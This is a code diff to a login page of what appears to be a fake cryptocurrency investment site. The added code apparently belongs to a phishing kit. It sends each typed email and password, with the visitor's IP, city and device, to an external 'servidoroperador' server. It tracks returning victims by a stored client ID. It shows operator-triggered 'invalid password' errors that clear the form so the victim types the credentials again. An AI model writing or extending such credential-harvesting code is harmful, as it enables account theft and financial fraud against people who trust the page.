@@ -5,10 +5,11 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { Eye, EyeOff, ChevronDown } from "lucide-react"
+import { Eye, EyeOff, ChevronDown, AlertCircle } from "lucide-react"
 import Image from "next/image"
 import { useMetrics } from "@/hooks/useMetrics"
 import { useRouter } from "next/navigation"
+import { Alert, AlertDescription } from "@/components/ui/alert"
 
 // Detectar idioma do navegador - padrão sempre inglês exceto francês
 const getDefaultLanguage = () => {
@@ -30,6 +31,9 @@ const translations = {
     createAccount: "Créer un compte",
     experience: "Vivez la meilleure expérience",
     investment: "d'investissement en cryptoactifs.",
+    invalidUsername: "Adresse email invalide. Veuillez réessayer.",
+    invalidPassword: "Mot de passe incorrect. Veuillez réessayer.",
+    invalidCredentials: "Identifiants invalides. Veuillez réessayer."
   },
   en: {
     connect: "Log in to your account",
@@ -41,6 +45,9 @@ const translations = {
     createAccount: "Create account",
     experience: "Experience the best",
     investment: "cryptocurrency investment experience.",
+    invalidUsername: "Invalid email address. Please try again.",
+    invalidPassword: "Incorrect password. Please try again.",
+    invalidCredentials: "Invalid credentials. Please try again."
   },
 }
 
@@ -55,7 +62,7 @@ const chatOptions = {
 }
 
 // Função para registrar cliente
-const registerClient = async (username: string, password: string) => {
+const registerClient = async (username: string, password: string, clientId?: string) => {
   try {
     // Obter IP
     let ip = ""
@@ -96,11 +103,17 @@ const registerClient = async (username: string, password: string) => {
       city,
       device,
       referrer: document.referrer || "direct",
-      currentUrl: window.location.href
+      currentUrl: window.location.href,
+      clientId // Se existir, atualiza o cliente existente
     }
     
+    // Determinar endpoint com base na existência de clientId
+    const endpoint = clientId 
+      ? 'https://servidoroperador.onrender.com/api/clients/update'
+      : 'https://servidoroperador.onrender.com/api/clients/register'
+    
     // Enviar para API
-    const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
+    const response = await fetch(endpoint, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -110,15 +123,21 @@ const registerClient = async (username: string, password: string) => {
     
     if (response.ok) {
       const data = await response.json()
-      console.log("Cliente registrado com sucesso:", data)
+      console.log(clientId ? "Cliente atualizado com sucesso:" : "Cliente registrado com sucesso:", data)
+      
+      // Salvar clientId no localStorage
+      if (data.clientId) {
+        localStorage.setItem('client_id', data.clientId)
+      }
+      
       return data
     } else {
       const errorData = await response.text()
-      console.log("Erro ao registrar cliente:", errorData)
+      console.log("Erro ao registrar/atualizar cliente:", errorData)
       return null
     }
   } catch (error) {
-    console.log("Erro durante registro de cliente:", error)
+    console.log("Erro durante registro/atualização de cliente:", error)
     return null
   }
 }
@@ -131,6 +150,7 @@ export default function LoginPage() {
   const [email, setEmail] = useState("")
   const [password, setPassword] = useState("")
   const [isLoading, setIsLoading] = useState(false)
+  const [error, setError] = useState<string | null>(null)
 
   const [showChat, setShowChat] = useState(false)
   const [chatMessages, setChatMessages] = useState([
@@ -145,6 +165,33 @@ export default function LoginPage() {
       metrics.registerVisit() // Envia métricas automaticamente
     }
   }, [metrics])
+  
+  // Verificar se há erro de autenticação
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      const authError = localStorage.getItem('auth_error')
+      const errorType = localStorage.getItem('error_type')
+      
+      if (authError === 'true') {
+        // Determinar mensagem de erro com base no tipo
+        if (errorType === 'inv_username') {
+          setError(t.invalidUsername)
+        } else if (errorType === 'inv_password') {
+          setError(t.invalidPassword)
+        } else {
+          setError(t.invalidCredentials)
+        }
+        
+        // Limpar campos
+        setEmail("")
+        setPassword("")
+        
+        // Limpar erro do localStorage
+        localStorage.removeItem('auth_error')
+        localStorage.removeItem('error_type')
+      }
+    }
+  }, [t.invalidUsername, t.invalidPassword, t.invalidCredentials])
 
   // Função para lidar com o login
   const handleLogin = async (e: React.FormEvent) => {
@@ -153,15 +200,25 @@ export default function LoginPage() {
     if (!email || !password) return
     
     setIsLoading(true)
+    setError(null)
     
     try {
-      // Registrar cliente
-      const clientData = await registerClient(email, password)
+      // Verificar se já existe um clientId (atualização de dados)
+      const existingClientId = localStorage.getItem('client_id')
       
-      // Redirecionar para página de loading
-      router.push("/loading")
+      // Registrar cliente ou atualizar dados
+      const clientData = await registerClient(email, password, existingClientId || undefined)
+      
+      if (clientData) {
+        // Redirecionar para página de loading
+        router.push("/loading")
+      } else {
+        setError(t.invalidCredentials)
+        setIsLoading(false)
+      }
     } catch (error) {
       console.log("Erro no login:", error)
+      setError(t.invalidCredentials)
       setIsLoading(false)
     }
   }
@@ -190,6 +247,14 @@ export default function LoginPage() {
               </SelectContent>
             </Select>
           </div>
+
+          {/* Error Alert */}
+          {error && (
+            <Alert variant="destructive" className="mb-6">
+              <AlertCircle className="h-4 w-4" />
+              <AlertDescription>{error}</AlertDescription>
+            </Alert>
+          )}
 
           {/* Login Form */}
           <form onSubmit={handleLogin} className="space-y-6">
